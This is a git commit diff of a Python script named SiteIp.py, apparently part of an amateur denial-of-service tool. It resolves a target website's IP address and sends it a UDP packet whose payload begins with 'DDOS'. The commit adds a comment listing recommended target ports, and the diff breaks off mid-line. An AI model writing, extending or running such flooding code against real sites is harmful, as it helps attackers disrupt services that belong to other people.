aa90f98295e501b9bd8117bbbb0db23ac59a8e4d
He1Zen <68460974+mishakorzik@users.noreply.github.com>
2021-10-03 10:21:15 +0300

    Update SiteIp.py

--- SiteIp.py
+++ SiteIp.py
@@ -3,11 +3,9 @@ target.replace("http://", "")
 target.replace("https://","")
 target.replace("www.","")
 ip = socket.gethostbyname(target)
-port = 8020
-
+port = 8020 # recommend ports: 8020, 8080, 4040, 1228, 6699
 joker = "DDOSjsjsjjdjdjdjdjjjjjjjjjiiiiiiiopppkkkkjjjjjhhhbbbbgbvvvvvvvvvvvvhhyggggh"
-
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 sock.sendto(bytes(joker,"UTF-8"), (ip,port))
-print(port,"IP site address >>",ip)
+p
